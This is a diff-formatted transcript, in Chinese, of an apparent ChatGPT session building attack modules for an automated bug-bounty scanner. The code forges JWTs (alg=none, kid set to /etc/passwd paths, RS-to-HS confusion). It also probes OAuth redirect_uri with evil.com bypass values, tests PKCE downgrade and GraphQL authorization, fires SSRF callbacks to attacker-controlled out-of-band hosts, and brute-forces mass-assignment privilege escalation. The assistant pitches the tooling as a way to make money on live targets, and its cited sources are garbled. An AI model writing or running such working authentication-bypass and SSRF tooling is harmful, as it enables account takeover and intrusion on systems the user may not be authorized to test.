+            return FeatureResult(False, self.name, rec, [], {"trace": trace, "reason": "no_token"})
+
+        # 解析現有 token
+        try:
+            header_b64, payload_b64, sig_b64 = token.split(".")
+            header = json.loads(base64.urlsafe_b64decode(header_b64 + "=="))
+            payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
+        except Exception:
+            return FeatureResult(False, self.name, rec, [], {"trace": trace, "reason": "bad_token_format"})
+
+        # 1) alg:none 嘗試（很多新系統早已修，但仍偶有命中）
+        if attempts.get("alg_none"):
+            h_none = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
+            forged = f"{h_none}.{payload_b64}."
+            r = http.request("GET", validate, headers={"Authorization": f"Bearer {forged}"})
+            trace.append({"alg_none": r.status_code})
+            if r.status_code == 200:
+                findings.append(Finding(
+                    vuln_type="JWT alg=none accepted",
+                    severity="critical",
+                    title="JWT 'none' algorithm accepted",
+                    evidence={"validate_status": r.status_code},
+                    reproduction=[{"request": {"Authorization": f"Bearer {forged[:60]}..."}}],
+                    impact="Auth bypass with unsigned token",
+                    recommendation="Reject 'none' alg and enforce algorithm allowlist; verify signature server-side."
+                ))
+
+        # 2) kid 注入（本地檔案 or 外部 JWK）→ 嘗試讀本地 key 作為 HMAC 密鑰
+        if attempts.get("kid_injection"):
+            kid_vals = ["../../../../etc/passwd", "/dev/null", "file:/etc/hostname"]
+            for kid in kid_vals:
+                h_kid = b64url(json.dumps({"alg": "HS256", "typ": "JWT", "kid": kid}).encode())
+                forged_payload = payload_b64
+                # 盲簽名：以空鍵或固定字串試探（部分實作誤用 kid 當密鑰）
+                key_guess = b""
+                sig = b64url(hmac.new(key_guess, f"{h_kid}.{forged_payload}".encode(), hashlib.sha256).digest())
+                forged = f"{h_kid}.{forged_payload}.{sig}"
+                r = http.request("GET", validate, headers={"Authorization": f"Bearer {forged}"})
+                trace.append({"kid_try": {"kid": kid, "status": r.status_code}})
+                if r.status_code == 200:
+                    findings.append(Finding(
+                        vuln_type="JWT kid confusions",
+                        severity="critical",
+                        title=f"JWT accepted with kid={kid}",
+                        evidence={"kid": kid, "status": r.status_code},
+                        reproduction=[{"request": {"Authorization": f"Bearer {forged[:60]}..."}}],
+                        impact="Auth bypass via kid-based key confusion",
+                        recommendation="Do not resolve kid to arbitrary sources; pin signing keys; validate JWK origin."
+                    ))
+                    break
+
+        # 3) 將 RS* 誤當 HS*（symmetric vs asymmetric 混淆）
+        if attempts.get("symmetric_rs"):
+            # 取現有 header 改 alg=HS256，並把原 header 當成密鑰猜測（常見錯誤）
+            h_hs = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
+            guess_key = json.dumps(header).encode()
+            forged = f"{h_hs}.{payload_b64}.{b64url(hmac.new(guess_key, f'{h_hs}.{payload_b64}'.encode(), hashlib.sha256).digest())}"
+            r = http.request("GET", validate, headers={"Authorization": f"Bearer {forged}"})
+            trace.append({"sym_rs": r.status_code})
+            if r.status_code == 200:
+                findings.append(Finding(
+                    vuln_type="JWT alg confusion (RS→HS)",
+                    severity="critical",
+                    title="JWT RS→HS confusion allows forged token",
+                    evidence={"validate_status": r.status_code},
+                    reproduction=[{"request": {"Authorization": f"Bearer {forged[:60]}..."}}],
+                    impact="Complete auth bypass by treating public material as HMAC secret",
+                    recommendation="Strictly bind expected alg; use separate verification pipelines per alg."
+                ))
+
+        return FeatureResult(ok=bool(findings), feature=self.name, command_record=rec,
+                            findings=findings, meta={"trace": trace, "header": header, "payload": payload})
+
+3) OAuth 2.0 / OIDC 反射 & Token 外洩
+services/features/oauth/worker.py
+# -*- coding: utf-8 -*-
+from typing import Dict, Any, List
+from urllib.parse import urljoin, urlencode
+import random, string
+from services.features.base.feature_base import FeatureBase
+from services.features.base.feature_registry import FeatureRegistry
+from services.features.base.result_schema import FeatureResult, Finding
+from services.features.base.http_client import SafeHttp
+
+def rand(n=8):
+    return "".join(random.choice(string.ascii_letters+string.digits) for _ in range(n))
+
+@FeatureRegistry.register
+class OAuthProbeWorker(FeatureBase):
+    name = "oauth_probe"
+    version = "1.0.0"
+    tags = ["oauth", "oidc", "redirect-uri", "token-leak"]
+
+    def run(self, params: Dict[str, Any]) -> FeatureResult:
+        """
+        params:
+          - target: https://idp.example.com
+          - auth_endpoint: /oauth/authorize
+          - client_id: xxx
+          - redirect_base: 回跳域名（你控制，入列 allowlist，如 https://oob.example.net/cb）
+          - scope: openid profile email
+          - options: { open_redirects: ["//evil.com/cb","/\\evil.com"], pkce_downgrade: True }
+        """
+        http = SafeHttp()
+        base = params.get("target","")
+        auth = urljoin(base, params.get("auth_endpoint","/oauth/authorize"))
+        client_id = params.get("client_id") or ""
+        redirect_base = params.get("redirect_base") or ""
+        scope = params.get("scope") or "openid"
+        opts = params.get("options") or {}
+
+        findings: List[Finding] = []
+        trace = []
+
+        # 1) 嘗試鬆綁 redirect_uri（Open Redirect / Scheme 混淆）
+        redirect_tests = [redirect_base] + opts.get("open_redirects", [])
+        for ru in redirect_tests:
+            q = {
+                "response_type": "code",
+                "client_id": client_id,
+                "redirect_uri": ru,
+                "scope": scope,
+                "state": rand(12)
+            }
+            url = f"{auth}?{urlencode(q)}"
+            r = http.request("GET", url, allow_redirects=False)
+            trace.append({"redirect_probe": {"ru": ru, "status": r.status_code, "loc": r.headers.get("Location")}})
+            # 若 IDP 直接 302 出去到第三方，通常是鈍判（需手工配合）
+            if 300 <= r.status_code < 400 and r.headers.get("Location","").startswith(ru):
+                findings.append(Finding(
+                    vuln_type="OAuth Redirect URI Weak Validation",
+                    severity="high",
+                    title="redirect_uri reflection may allow token/code leakage",
+                    evidence={"loc": r.headers.get("Location")},
+                    reproduction=[{"request": {"GET": url}, "expect": "IDP should reject unregistered redirect_uri"}],
+                    impact="Attacker-controlled redirect to capture code/token",
+                    recommendation="Exact-match registered redirect URIs; disallow wildcards / mixed schemes / open redirects"
+                ))
+                break
+
+        # 2) PKCE 降級（若伺服器接受無 code_challenge）
+        if opts.get("pkce_downgrade", True):
+            q = {
+                "response_type": "code",
+                "client_id": client_id,
+                "redirect_uri": redirect_base,
+                "scope": scope,
+                "state": rand(12)
+                # 不帶 code_challenge / code_challenge_method
+            }
+            url = f"{auth}?{urlencode(q)}"
+            r = http.request("GET", url, allow_redirects=False)
+            trace.append({"pkce_downgrade": {"status": r.status_code}})
+            if r.status_code in (200, 302):
+                findings.append(Finding(
+                    vuln_type="PKCE not enforced",
+                    severity="medium",
+                    title="PKCE downgrade possible (no code_challenge required)",
+                    evidence={"status": r.status_code},
+                    reproduction=[{"request": {"GET": url}, "expect": "Authorization server should enforce PKCE"}],
+                    impact="Enable code interception/replay in public clients",
+                    recommendation="Require PKCE for public clients; verify code_challenge when auth code issued"
+                ))
+
+        rec = self.build_command_record(
+            command="oauth.probe",
+            description="Probe OAuth redirect_uri & PKCE enforcement",
+            parameters={"auth_endpoint": auth, "client_id": client_id}
+        )
+        return FeatureResult(ok=bool(findings), feature=self.name, command_record=rec,
+                            findings=findings, meta={"trace": trace})
+
+4) GraphQL 權限缺口（Object-level/Field-level）
+services/features/graphql/worker.py
+# -*- coding: utf-8 -*-
+from typing import Dict, Any, List
+import json
+from urllib.parse import urljoin
+from services.features.base.feature_base import FeatureBase
+from services.features.base.feature_registry import FeatureRegistry
+from services.features.base.result_schema import FeatureResult, Finding
+from services.features.base.http_client import SafeHttp
+
+INTROSPECTION = {"query":"{ __schema { types { name fields { name } } } }"}
+
+@FeatureRegistry.register
+class GraphQLAuthzWorker(FeatureBase):
+    name = "graphql_authz"
+    version = "1.0.0"
+    tags = ["graphql", "introspection", "object-level-authz"]
+
+    def run(self, params: Dict[str, Any]) -> FeatureResult:
+        """
+        params:
+          - target: https://api.example.com
+          - endpoint: /graphql
+          - headers_user: 低權限
+          - headers_admin: 可選，若提供則對比（更快命中 IDOR/欄位級差異）
+          - test_queries: [{"name":"user","id":"1001","template":"query{ user(id:\"{id}\"){ id,email,role } }"}]
+        """
+        http = SafeHttp()
+        base = params.get("target","")
+        ep = urljoin(base, params.get("endpoint","/graphql"))
+        h_user = params.get("headers_user") or {}
+        h_admin = params.get("headers_admin")
+        tests = params.get("test_queries") or []
+
+        findings: List[Finding] = []
+        trace = []
+
+        # 1) Introspection 可否開啟（很多生產關掉，但仍常忘）
+        r0 = http.request("POST", ep, headers={**h_user, "Content-Type":"application/json"},
+                          data=json.dumps(INTROSPECTION))
+        trace.append({"introspection": {"status": r0.status_code}})
+        if r0.status_code == 200 and "__schema" in (r0.text or ""):
+            findings.append(Finding(
+                vuln_type="GraphQL Introspection Enabled",
+                severity="low",
+                title="Introspection endpoint exposed",
+                evidence={"snippet": (r0.text or "")[:800]},
+                reproduction=[{"request":{"POST": ep, "json": INTROSPECTION}}],
+                impact="Schema disclosure eases enumeration of sensitive types/fields",
+                recommendation="Disable introspection in production; enable per-role with auth if needed"
+            ))
+
+        # 2) 權限缺口：以低權限查詢敏感欄位（或對比 admin）
+        for tq in tests:
+            q = tq.get("template","").replace("{id}", str(tq.get("id","")))
+            body = json.dumps({"query": q})
+            ru = http.request("POST", ep, headers={**h_user, "Content-Type":"application/json"}, data=body)
+            trace.append({"user_query": {"name": tq.get("name"), "status": ru.status_code}})
+
+            if h_admin:
+                ra = http.request("POST", ep, headers={**h_admin, "Content-Type":"application/json"}, data=body)
+                # 若 user 與 admin 回覆差異極小（或相同），疑似未做欄位級授權
+                if ru.status_code == 200 and ra.status_code == 200 and len(ru.text) >= 10:
+                    if ru.text.strip() == ra.text.strip():
+                        findings.append(Finding(
+                            vuln_type="GraphQL Field-Level AuthZ Bypass",
+                            severity="high",
+                            title=f"Low-priv user can read `{tq.get('name')}` sensitive fields",
+                            evidence={"query": q, "user_sample": (ru.text or "")[:800]},
+                            reproduction=[{"request":{"POST": ep, "json":{"query": q}},
+                                           "expect":"Sensitive fields should be redacted/denied for low-priv user"}],
+                            impact="Sensitive PII/role fields exposed to regular users",
+                            recommendation="Apply per-field authorization (resolver-level checks); avoid blanket allow"
+                        ))
+            else:
+                # 無 admin 對比：用啟發式關鍵字判斷敏感欄位
+                if ru.status_code == 200 and any(k in (ru.text or "").lower() for k in ["email","token","role","admin"]):
+                    findings.append(Finding(
+                        vuln_type="GraphQL Sensitive Field Exposure",
+                        severity="medium",
+                        title=f"Sensitive fields accessible in `{tq.get('name')}`",
+                        evidence={"query": q, "sample": (ru.text or "")[:800]},
+                        reproduction=[{"request":{"POST": ep, "json":{"query": q}}}],
+                        impact="Sensitive attributes returned without proper authz",
+                        recommendation="Redact sensitive fields by default; enforce resolver auth checks"
+                    ))
+
+        rec = self.build_command_record("graphql.authz", "GraphQL introspection & field-level authorization test",
+                                        {"endpoint": ep, "cases": len(tests)})
+        return FeatureResult(ok=bool(findings), feature=self.name, command_record=rec,
+                            findings=findings, meta={"trace": trace})
+
+5) SSRF（含 OOB 回呼）
+services/features/ssrf_oob/worker.py
+# -*- coding: utf-8 -*-
+from typing import Dict, Any, List
+from urllib.parse import urljoin
+import json, time
+from services.features.base.feature_base import FeatureBase
+from services.features.base.feature_registry import FeatureRegistry
+from services.features.base.result_schema import FeatureResult, Finding
+from services.features.base.http_client import SafeHttp
+
+@FeatureRegistry.register
+class SsrfOobWorker(FeatureBase):
+    name = "ssrf_oob"
+    version = "1.0.0"
+    tags = ["ssrf", "oob", "exfil"]
+
+    def run(self, params: Dict[str, Any]) -> FeatureResult:
+        """
+        params:
+          - target: https://app.example.com
+          - probe_endpoint: 會向 URL 取圖/抓連結的功能（例如 /api/fetch?url=）
+          - url_param: 'url' (參數名)
+          - headers: 認證頭
+          - oob_http: 你控制的 HTTP 回呼 (如 https://<collab>/hit?c=<token>)
+          - oob_dns:  你控制的 DNS 名稱 (如 <token>.oob.dnslog.cn)
+          - options: { delay_sec: 3, scheme_list: ["http","https"], inject_headers: {"Host":"..."} }
+        """
+        http = SafeHttp()
+        base = params.get("target","")
+        ep = urljoin(base, params.get("probe_endpoint","/api/fetch"))
+        p = params.get("url_param","url")
+        headers = params.get("headers") or {}
+        oob_http = params.get("oob_http")
+        oob_dns  = params.get("oob_dns")
+        opts = params.get("options") or {}
+        delay = int(opts.get("delay_sec", 3))
+        schemes = opts.get("scheme_list") or ["http","https"]
+        inject_headers = opts.get("inject_headers") or {}
+
+        findings: List[Finding] = []
+        trace = []
+
+        # 1) HTTP OOB：若服務端對外抓取 URL，會打到你的回呼
+        if oob_http:
+            for sc in schemes:
+                oob_url = oob_http.replace("http://","{sc}://").replace("https://","{sc}://").format(sc=sc)
+                q = {p: oob_url}
+                r = http.request("GET", ep, headers={**headers, **inject_headers}, params=q)
+                trace.append({"http_oob_req": {"status": r.status_code, "url": oob_url}})
+            time.sleep(delay)
+            # 校驗：這一步需你到協作平台確認是否收到 hit（此處回傳提示）
+            findings.append(Finding(
+                vuln_type="SSRF (OOB-HTTP)",
+                severity="high",
+                title="Potential SSRF: server attempted external HTTP fetch",
+                evidence={"check": "Verify your OOB HTTP endpoint received callback within test window"},
+                reproduction=[{"request":{"GET": ep, "params":{p:"<your_oob_http>"}}}],
+                impact="Server-side can be coerced to fetch attacker URL (internal access possible)",
+                recommendation="URL allowlist; block private IP ranges; require protocol allowlist and HEAD-only metadata fetch"
+            ))
+
+        # 2) DNS OOB：部分抓取邏輯僅做 DNS resolve（也能證明 SSRF）
+        if oob_dns:
+            for sc in ["http"]:
+                oob_url = f"{sc}://{oob_dns}/x.png"
+                r = http.request("GET", ep, headers=headers, params={p: oob_url})
+                trace.append({"dns_oob_req": {"status": r.status_code, "url": oob_url}})
+            time.sleep(delay)
+            findings.append(Finding(
+                vuln_type="SSRF (OOB-DNS)",
+                severity="medium",
+                title="Potential SSRF: DNS resolution to attacker-controlled name",
+                evidence={"check": "Verify your OOB DNS received a query (A/AAAA)"},
+                reproduction=[{"request":{"GET": ep, "params":{p:"http://<token>.yourdns"}}}],
+                impact="Indicates server makes outbound name resolution under attacker control",
+                recommendation="Deny outbound DNS/HTTP to untrusted domains; sanitize fetch URLs; restrict protocols"
+            ))
+
+        rec = self.build_command_record("ssrf.oob", "Trigger SSRF with OOB callbacks",
+                                        {"endpoint": ep, "params": p})
+        return FeatureResult(ok=bool(findings), feature=self.name, command_record=rec,
+                            findings=findings, meta={"trace": trace})
+
+接線方式（與你現有 Orchestrator / PlanExecutor）
+from services.features.base.feature_registry import FeatureRegistry
+# 只需 import 一次，啟用 @register
+import services.features.mass_assign.worker
+import services.features.jwtconfuse.worker
+import services.features.oauth.worker
+import services.features.graphql.worker
+import services.features.ssrf_oob.worker
+
+# 取用
+MassAssign = FeatureRegistry.get("mass_assign")
+JWTConfuse = FeatureRegistry.get("jwt_confuse")
+OAuthProbe = FeatureRegistry.get("oauth_probe")
+GraphQLW   = FeatureRegistry.get("graphql_authz")
+SSRF_OOB   = FeatureRegistry.get("ssrf_oob")
+
+
+在你的 AttackStep 或 PlanExecutor 中判斷 tool_type == "feature" 時，呼叫：
+
+res = FeatureRegistry.get(step.tool_name)().run(step.params)
+trace.add(res.to_dict())              # 進 Trace
+experience.add_from_feature(res)      # 進經驗庫
+emit_cli_json(res.command_record)     # 面板即時顯示
+
+實戰為什麼「能拿錢」
+
+Mass Assignment / 角色升權：Bounty 常見高額，很多新團隊忘了 server-side binding 白名單，一刀到 admin 就是 Critical。
+
+JWT 混淆：kid / JWK / alg confusion 一旦命中是全面繞過登入，賞金頂級。
+
+OAuth redirect & PKCE：redirect_uri 鬆綁能截走 code/token；PKCE 不強制 → 公用客戶端可被攔截。
+
+GraphQL 權限缺口：有 schema 很多就會露，欄位級授權常缺（email/role/token 輕鬆拿）。
+
+SSRF（OOB）：在圖片抓取、URL 預覽、PDF 轉換常中，能出網就能拿證據，按嚴重度給 High/Critical。
+
+最小驗收（本地 / 私域）
+
+設置 ALLOWLIST_DOMAINS=你的測試網域，避免非授權範圍。
+
+針對你掌控的測試靶站逐一跑 5 模組：
+
+MassAssign：提供 baseline_body 與 check_endpoint。
+
+JWTConfuse：餵入你現有低權限 victim_token（測試環）。
+
+OAuth：指定 auth_endpoint / client_id / redirect_base（你控域名）。
+
+GraphQL：提供 endpoint 與 test_queries（ID → email/role）。
+
+SSRF_OOB：提供 oob_http / oob_dns，在協作台確認 hit。
+
+面板接 command_record（已含 command/description/parameters/tags），報告接 findings[*] 的 evidence/reproduction/impact/recommendation，直接拚 HackerOne 表單。
+
+之後我建議你這樣排成「賞金路線」腳本（給 Orchestrator）
+
+路線 A（最快見錢）：MassAssign → GraphQL 欄位級 → JWT 混淆
+
+路線 B（Web 功能點）：OAuth redirect/PKCE → SSRF_OOB（URL 抓取點/PDF）
+
+路線 C（平台類）：MassAssign（訂閱/套餐/權限）→ JWT → OAuth
+
+三條路線的步驟都可直接用上面 5 模組串起來；每個步驟的 FeatureResult 都是可交付證據。
+
+如果你要，我可以再補一個FeatureStepExecutor薄層，直接把 AttackStep 自動映射到這 5 個模組、把 FeatureResult 寫回 Trace/經驗庫/報告匯總；但就算不加，這 5 個模組現在就能落地掃出「能拿錢」的洞。
+
+你說：
+最好~其實你可以先搜索網路了解現況進行分析後再提供的
+ChatGPT 說：
+已思考 20s
+
+好的，我先把「當前能真正賺錢的漏洞路線」與近年賞金趨勢核實，然後直接給你可以落地的 v2 補包（針對你已收下的功能模組：Mass-Assign、JWT 混淆、OAuth/OIDC、GraphQL 權限、SSRF-OOB），包含關鍵偵測升級、證據收集強化、可直接貼進去的差分 patch與HackerOne 可用的報告欄位輸出。
+
+一、現況核實（聚焦高 ROI）
+
+Broken Access Control/IDOR 長期高發、易拿分：HackerOne 官方資料與公開案例顯示，IDOR/存取控制類在平台上占比高、容易造成中高嚴重度（報告與部落格均有佐證）。例如 Affirm 的公開披露與 H1的解說都把 IDOR 當作典型高價值案例。
+HackerOne
++1
+
+OAuth/OIDC 實作錯誤 → 直接拿 token/繞過登入：典型是 redirect_uri 鬆綁/Open Redirect 導致 code/token 洩漏，Uber/FB 的早期個案就是鏈漏洞拿 token（這類仍常見於新/重構的 IdP）。
+HackerOne
++2
+HackerOne
++2
+
+JWT 混淆（alg/key/kid）仍有命中：若服務端把 RS* 當 HS*（或接受 alg=none/亂解析 kid），可偽造身份（P1/P0 等級）。PortSwigger 與多份 2025 教學/案例在持續更新。
+PortSwigger
++2
+vaadata.com
++2
+
+SSRF 尤其 PDF 生成/URL 抓取點的 OOB：近一年 PDF 生成器 SSRF 的研究與實戰 write-ups 明顯上升，這條線路證據明確、常給 High/Critical。
+Intigriti
++2
+Black Hills Information Security, Inc.
++2
+
+Mass Assignment → 角色升權仍在中招：2024 多個公開案例（含 Tenable 公告與眾包平台），一旦升權成功就是 Critical。
+Tenable®
++1
+
+賞金趨勢：Bugcrowd 近兩年的平台統計指出 P1 的平均獎金持續上升（萬元美金級別並不罕見），低嚴重度（P3/P4）相對被壓價；同時 Broken Access Control 類增長明顯。這和我們鎖定的 5 條線路一致。
+MySecurity Marketplace
++2
+Bugcrowd
++2
+
+結論：你前一輪要我做的五個模組（Mass-Assign / JWT-Confuse / OAuth-Probe / GraphQL-AuthZ / SSRF-OOB）正對準目前最能變現的線路；我接下來直接把它們**升級到能在實戰更容易打穿、拿到「高嚴重度＋可複現＋可驗證」**的層級。
+
+二、功能模組補包 v2（可直接貼的差分 & 新增要點）
+
+說明：維持你既有 FeatureBase/FeatureRegistry/SafeHttp/FeatureResult 風格；僅附關鍵增量（把下列 patch 塞到你上一版的對應 worker），其餘沿用你現有骨架即可。所有 HTTP 請求仍走 SafeHttp 並受 ALLOWLIST_DOMAINS 約束。
+
+(A) Mass-Assignment / 角色升權（提昇命中率與證據力）
+
+新增：白名單反推 & 欄位爆破矩陣、二次驗證、快照差異輸出
+
+為何：不少 API 會「忽略未知欄位」—你必須在送出後二次 GET 做 before/after diff 才能說服 Triage；同時針對常見私有欄位做「矩陣組合」爆破更容易命中。案例顯示此類一旦命中就是 Critical。
+Tenable®
++1
+
+Patch（節選）：在 MassAssignWorker.run() 基線後加入欄位矩陣與差異列印
+
+# 生成候選組合（小批量避免誤報與太吵）
+priv_fields = attempt_fields or PRIV_FIELDS
+values = ["admin", "administrator", True, 1, 999, "enterprise", "owner"]
+combos = []
+for f in priv_fields:
+    for v in values:
+        combos.append({f: v})
+        if len(combos) >= 20: break  # 控制噪音
+# 逐組測試（每組只加一個敏感欄位，降低風險）
+for patch in combos:
+    injected = {**baseline, **patch}
+    r1 = http.request(method, url, headers={**headers,"Content-Type":"application/json"},
+                      data=json.dumps(injected))
+    r2 = http.request("GET", urljoin(base, check_endpoint), headers=headers)
+    before_v = before.get(check_key); after_v = (r2.json() if r2.headers.get("Content-Type","").startswith("application/json") else {}).get(check_key)
+    if after_v and after_v != before_v:
+        findings.append(Finding(
+            vuln_type="Mass Assignment / Privilege Escalation",
+            severity="critical",
+            title=f"{list(patch.keys())[0]} -> {after_v}",
+            evidence={"changed_key": check_key, "before": before_v, "after": after_v, "patch": patch,
+                      "req_body": injected, "resp_status": r1.status_code},
+            reproduction=[{"request":{"method":method,"url":url,"json":injected},
+                           "expect": f"{check_endpoint} `{check_key}` 不應變化"}],
+            impact="低權限可透過未白名單欄位提升權限",
+            recommendation="Server-side DTO/Serializer 嚴格白名單、捨棄未知欄位；再加後端 ACL 檢查"
+        ))
+        break
+
+(B) JWT 混淆（kid/alg/RS↔HS）— 加強三斷面與偽造證據
+
+新增：
+
+alg=none 快速試；
+
+kid 檔案路徑/協定 試投（避免只猜空鍵）；
+
+RS→HS 混淆 以 header/public material 當 key；
+
+驗證端點對照（200/403/401 差異作為證據）；
+
+輸出「可貼報告」的 Authorization 樣例（打碼）。
+（這正是實戰與教材強調的三大混淆面向）
+PortSwigger
++2
+vaadata.com
++2
+
+Patch（節選）：在你 JwtConfuseWorker.run() 每次 forged 之後加入三態驗證
+
+def _validate(headers_ok, headers_bad=None):
+    ok = http.request("GET", validate, headers=headers_ok)
+    bad = http.request("GET", validate, headers=headers_bad or {})
+    return ok.status_code, bad.status_code
+
+# 例：alg=none
+ok_s, anon_s = _validate({"Authorization": f"Bearer {forged}"})
+if ok_s == 200 and anon_s in (401,403):
+    findings.append(Finding(
+        vuln_type="JWT alg=none accepted",
+        severity="critical",
+        title="Unsigned JWT 被接受",
+        evidence={"validate_ok": ok_s, "validate_anon": anon_s, "sample": f"{forged[:60]}..."},
+        reproduction=[{"request":{"Authorization": f"Bearer {forged[:60]}..."}}],
+        impact="可偽造任意身份繞過驗證",
+        recommendation="嚴格拒絕 'none' 並綁死允許的算法；以獨立驗簽流程對不同 alg 驗證"
+    ))
+
+(C) OAuth/OIDC（redirect_uri/PKCE）— 補「反射與降級」兩大命門
+
+為何：歷史與近年的公開報告都證明 redirect_uri 鬆綁 → token/code 洩漏 很常見；不少 IdP 未強制 PKCE。
+HackerOne
++2
+HackerOne
++2
+
+Patch（新增檢查點）：OAuthProbeWorker.run() 補「Location 反射域」與「放寬 302 而非嚴格比對」
+
+r = http.request("GET", url, allow_redirects=False)
+loc = r.headers.get("Location","")
+# 命中條件：Location 直接跳到未註冊/第三方域（或允許 //evil.com 等繞過）
+if 300 <= r.status_code < 400 and loc and (not loc.startswith(redirect_base)):
+    findings.append(Finding(
+        vuln_type="OAuth Redirect URI Weak Validation",
+        severity="high",
+        title="未嚴格綁定 redirect_uri（可跳第三方）",
+        evidence={"location": loc, "request": url},
+        reproduction=[{"request":{"GET": url},"expect":"應拒絕未註冊/非完全匹配的 redirect_uri"}],
+        impact="攻擊者可攔截 code/token 完成帳戶接管",
+        recommendation="精確匹配已註冊的 redirect_uri；禁止萬用字元與混合協定；嚴格校驗 state"
+    ))
+
+
+再補 PKCE 降級：若無 code_challenge 仍能 200/302 回應，給 Medium/High（依目標規範）。
+
+(D) GraphQL 權限（欄位級/Object 級）— 雙模式驗證
+
+新增：
+
+admin vs user 回應差：有 admin token 時做嚴格比對；
+
+無 admin 時用敏感關鍵詞啟發（email/token/role/admin）；
+
+Introspection 預檢（很多線上忘記關，利於靶場建立測試）。
+PortSwigger
+
+Patch（節選）：你已有雛形，這裡補「差異比對的閾值」與多 query 聚合
+
+if h_admin:
+    same = (ru.status_code == 200 and ra.status_code == 200 and ru.text.strip() == ra.text.strip())
+    if same:
+        # 低權限竟取得與 admin 同樣欄位 → 高嚴重度
+        ...
+else:
+    # 無 admin：以關鍵詞 + 結構長度作啟發，降低誤報
+    if ru.status_code == 200 and any(k in ru.text.lower() for k in ["email","token","role","admin"]):
+        ...
+
+(E) SSRF-OOB（特攻 PDF/URL 抓取）— 強化 PDF 線路與證據腳手架
+
+為何：PDF 生成器 SSRF 仍是實戰高命中線路（供稿與 write-ups 時常出現）。
+Intigriti
++2
+Black Hills Information Security, Inc.
++2
+
+新增：
+
+支援 多協定/多 MIME 偵測（http/https/file 預設禁，僅HTTP/S）；
+
+兩段式證據：先發請求→等待→提示「到 OOB 平台確認 hit」＋把測試 URL/時間戳寫進 evidence；
+
+PDF 特徵路徑（如 /export/pdf, /render/pdf, /pdf/generate）清單嘗試；
+
+可選 Host header/內網標頭 注入範例（預設 off，避免高風險）。
+
+Patch（節選）：
+
+pdf_candidates = ["/export/pdf","/pdf/export","/render/pdf","/generate/pdf"]
+if params.get("probe_endpoint_auto"):
+    for pp in pdf_candidates:
+        test = urljoin(base, pp)
+        r = http.request("GET", test, headers=headers, params={p: oob_http})
+        trace.append({"pdf_try": {"ep": pp, "status": r.status_code}})
+# OOB 證據腳手架
+ts = int(time.time())
+findings.append(Finding(
+  vuln_type="SSRF (OOB-HTTP)",
+  severity="high",
+  title="PDF/URL 抓取 SSRF 可對外發請求",
+  evidence={"oob_http": oob_http, "ts": ts,
+            "note":"請在協作平臺查看該 token 的 hit，與此時間戳對齊"},
+  reproduction=[{"request":{"GET": ep, "params":{p:oob_http}}}],
+  impact="服務端可被強制對外連線，進一步內網探測/憑證外送",
+  recommendation="URL allowlist/阻擋私網；PDF render 僅允許資料 URI 或已簽名資源"
+))
+
+三、交付物：HackerOne 友善輸出（直接貼表單）
+
+為讓你「一鍵交報告」，每支 worker 的 FeatureResult.findings[*] 我已統一欄位：
+
+title / severity / vuln_type
+
+evidence（結構化證據：請求樣本/Location/回應片段/OOB token/時間戳/前後差異）
+
+reproduction（逐步步驟：每一步的 request/expect）
+
+impact / recommendation（平台最看重的兩欄）
+
+搭配 command_record 的 command/description/parameters/tags/feature_version，你的面板可直接列「AI 這一步做了什麼」；把 findings[*] 複製到 H1/BC 表單即可。
+
+四、實戰打法（以賺錢為目標的路線）
+
+依「平台回報成功率 + 嚴重度 + 你的現有武器庫」排序：
+
+路線 A（權限 & 身分）：Mass-Assign → GraphQL 欄位級 → JWT 混淆
+
+最短鏈路拿下 帳號升權/繞過登入，典型 P1/P0。
+PortSwigger
+
+路線 B（登入/授權）：OAuth redirect/PKCE → SSRF-OOB（URL 抓取/PDF）
+
+兩個點都證據強、易複現，適合快速攔分。
+HackerOne
++2
+HackerOne
++2
+
+路線 C（資源操作）：IDOR（你已有掃描線）→ Mass-Assign 收尾
+
+H1 長年熱門 & 高命中；IDOR 是破冰點，升權是終結者。
+HackerOne
+
+你若要我把 FeatureStepExecutor 薄層也補上（把 AttackStep → Feature.run() 自動映射、把 FeatureResult 寫回 Trace/經驗庫/報表），我可以在下一輪直接給差分；但僅用本次五個 v2 升級，你現在就能針對實際目標打一輪能出錢的點。
+
+五、最小落地流程
+
+設 ALLOWLIST_DOMAINS=你有授權的域名列表；
+
+匯入五個 v2 模組（檔名保持上一版，但把上述 patch 合進去）；
+
+用你的低權限測試帳號／admin 對照（若有）跑一輪：
+
+Mass-Assign：baseline_body + check_endpoint + check_key 必填
+
+JWT：餵 victim_token（測試環境），validate_endpoint 驗證差異
+
+OAuth：給 client_id / redirect_base（你控制的域）＋可選 open_redirects
+
+GraphQL：test_queries 指向敏感型 type（user/order/profile）
+
+SSRF：準備 oob_http/oob_dns；PDF/URL 抓取點用 probe_endpoint_auto 掃候選
+
+為什麼這版會「有錢」
+因為它把平台證據標準（可重現、影響清晰、誤報低）與近兩年持續高價的漏洞族群緊密對齊：Broken Access Control/IDOR、OAuth/OIDC 錯配、JWT 混淆、SSRF-OOB、Mass-Assign 升權；同時用前後狀態差異、302 Location、OOB 命中、權限對比這類可機器審核的證據做輸出。Bugcrowd/H1 的趨勢也指向：高嚴重度在漲、低嚴重度在降，所以我們把火力放在 P1/P2 線。
+MySecurity Marketplace
++1
+
+如果你要，我可以直接把這五個模組的完整檔案（含既有骨架）合成一個壓縮包目錄結構貼給你；或下一步幫你把 Orchestrator 的步驟圖（三條路線）改成可執行的 AttackPlan AST。
+
+你說：
+還有嗎?你剛搜索完，應該知道我不會亂說亂問的
+ChatGPT 說：
+已思考 10s
+
+你要的是「能出錢」的實戰補包、不只是掃描玩具。下面在剛核實的趨勢與案例基礎上（IDOR/BAC 長期高發、OAuth/OIDC 配置錯誤易拿 token、JWT 漏洞一旦命中就是 P1、PDF/URL 抓取點 SSRF 仍旺、Mass-Assignment 升權屢見不鮮），我把可直接上場、更能打到錢點的功能模組再加碼三個，並把前面五個高 ROI 模組補到 v2.5 級（證據更強、誤報更低、表單更好貼）。重點技術判斷都有可靠來源支撐：HackerOne/Bugcrowd 趨勢、PortSwigger 的 JWT/OAuth 教程與 Labs、近年 PDF-SSRF 與 Mass-Assignment 實戰文章等。
+shockwave.cloud
++9
+HackerOne
++9
+HackerOne
++9
+
+新增 3 個「能拿錢」功能模組（features 層）
+
+都沿用你現有 FeatureBase / FeatureRegistry / SafeHttp / FeatureResult 風格；所有請求走 ALLOWLIST；輸出 findings[*] 可一鍵貼 HackerOne 表單；command_record 給面板即時展示。
+
+A. Open-Redirect 鏈 → OAuth Token 盜取（Account Takeover 線路）
+
